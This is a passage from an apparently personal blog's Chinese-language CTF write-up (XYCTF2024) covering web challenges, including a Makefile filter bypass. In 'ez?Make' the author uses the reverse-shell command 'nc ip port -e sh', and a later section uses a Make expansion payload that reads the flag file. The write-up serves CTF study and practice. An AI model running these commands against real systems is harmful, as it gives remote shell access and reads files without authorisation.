+	srcset="/p/xyctf2024/image-20250908153452694_hu2894124558506547507.png 480w, /p/xyctf2024/image-20250908153452694_hu1359288940902305854.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250908153452694"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="193"
+		data-flex-basis="465px"
+	
+></p>
+<h2 id="ezmake-1">ez?Make
+</h2><h3 id="知识点反弹shell">知识点：反弹shell
+</h3><p>ban了一些东西，这里可以利用nc反弹shell，又是反弹shellQAQ</p>
+<p>这里有waf，肯定又不能用内网穿透反弹shell了（感觉研究出来都没怎么利用过）</p>
+<p>想到这突然想到有域名肯定有ip地址，在网上找了个域名解析网站</p>
+<p><a class="link" href="https://zhanchacha.cn/host-ip/"  target="_blank" rel="noopener"
+    >域名反查IP工具 - 域名IP查询 - 站查查</a></p>
+<p>然后真的能查到！</p>
+<p>那么就试试看，内网穿透反弹shell，能不能成功</p>
+<p>结果显而易见了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc ip port -e sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xyctf2024/image-20250908155608312.png"
+	width="1463"
+	height="805"
+	srcset="/p/xyctf2024/image-20250908155608312_hu4495900303433623950.png 480w, /p/xyctf2024/image-20250908155608312_hu14955597645050656047.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250908155608312"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="436px"
+	
+></p>
+<h2 id="εzмkε">εZ?¿м@Kε¿?
+</h2><h3 id="知识点无字母数字makefile">知识点：无字母数字makefile
+</h3><p>前提知识点</p>
+<p><a class="link" href="https://www.cnblogs.com/lelin/p/11152780.html"  target="_blank" rel="noopener"
+    >Makefile的编写及四个特殊符号的意义@、$@、$^、$ - 春风一郎 - 博客园</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">一、@
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">这个符串通常用在“规则”行中，表示不显示命令本身，而只显示它的结果，例如Makefile中的内容为：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DIR_OBJ=./obj
+</span></span><span class="line"><span class="cl">CMD_MKOBJDIR=if [ -d ${DIR_OBJ} ]; then exit 0; else mkdir ${DIR_OBJ}; fi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mkobjdir:
+</span></span><span class="line"><span class="cl">@${CMD_MKOBJDIR}
+</span></span><span class="line"><span class="cl">命令行执行如下：
+</span></span><span class="line"><span class="cl">make mkobjdir
+</span></span><span class="line"><span class="cl">此时不会显示在命令行不会显示出if [ -d ${DIR_OBJ} ]; then exit 0; else mkdir ${DIR_OBJ}; fi，但如果规则行的TAB后没有以@开头，则会显示，不信可以试试。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">二、$@、$^、$&lt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">这三个分别表示：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$@          --代表目标文件(target)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$^            --代表所有的依赖文件(components)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$&lt;           --代表第一个依赖文件(components中最左边的那个)。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$?           --代表示比目标还要新的依赖文件列表。以空格分隔。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$%           --仅当目标是函数库文件中，表示规则中的目标成员名。例如，如果一个目标是&#34;foo.a(bar.o)&#34;，那么，&#34;$%&#34;就是&#34;bar.o&#34;，&#34;$@&#34;就是&#34;foo.a&#34;。如果目标不是函数库文件（Unix下是[.a]，Windows下是[.lib]），那么，其值为空。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">三
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&#39; - &#39; 符号的使用
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">     通常删除，创建文件如果碰到文件不存在或者已经创建，那么希望忽略掉这个错误，继续执行，就可以在命令前面添加 -，
+</span></span><span class="line"><span class="cl">     -rm dir；
+</span></span><span class="line"><span class="cl">     -mkdir aaadir；
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">&#39; $ &#39;符号的使用
+</span></span><span class="line"><span class="cl">          美元符号$，主要扩展打开makefile中定义的变量
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">&#39; $$ &#39;符号的使用
+</span></span><span class="line"><span class="cl">          $$ 符号主要扩展打开makefile中定义的shell变量
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xyctf2024/image-20250908182908357.png"
+	width="1145"
+	height="725"
+	srcset="/p/xyctf2024/image-20250908182908357_hu960992155023403132.png 480w, /p/xyctf2024/image-20250908182908357_hu10567218956209009210.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250908182908357"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="379px"
+	
+></p>
+<p>解析一下，这里flag就是第一个依赖文件名</p>
+<p>在 Makefile 规则中：你写下 <code>$$(&lt;$&lt;)</code></p>
+<p>Makefile 解析：</p>
+<p><code>$$</code> -&gt; 转义成一个 <code>$</code></p>
+<p><code>$&lt;</code> -&gt; 替换成第一个依赖的文件名（例如 <code>input.txt</code>）</p>
+<p>结果：生成 Shell 命令 <code>$(&lt;input.txt)</code></p>
+<p><img src="/p/xyctf2024/image-20250908184724483.png"
+	width="1155"
+	height="806"
+	srcset="/p/xyctf2024/image-20250908184724483_hu374244189014454101.png 480w, /p/xyctf2024/image-20250908184724483_hu9091860781896679779.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250908184724483"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="143"
+		data-flex-basis="343px"
+	
+></p>
+<h2 id="baby_unserialize">baby_unserialize
+</h2><p>java题woc，留着吧。</p>
+<p>看是能看一点，但是还是有些难以理解</p>
+<p><a class="link" href="https://blog.csdn.net/uuzeray/article/details/138274291#ezPOP"  target="_blank" rel="noopener"
+    >【Web】2024XYCTF题解(全)_xyctf2024-CSDN博客</a></p>
+<p><a class="link" href="https://blog.csdn.net/Err0r233/article/details/138233565"  target="_blank" rel="noopener"
+    >XYCTF2024-Web方向题解-CSDN博客</a></p>
+<h2 id="小结">小结
+</h2><p>拖了这么久，终于是结束了，这个比赛题目很多，也很有收获，主要是有自己的研究发现我觉得是特别好的。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">极客大挑战2025</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyberstrikelab渗透复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">春秋云镜渗透复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025%E6%B1%9F%E8%A5%BF%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025江西信息技术省赛决赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/qctf2025/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">qctf2025</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
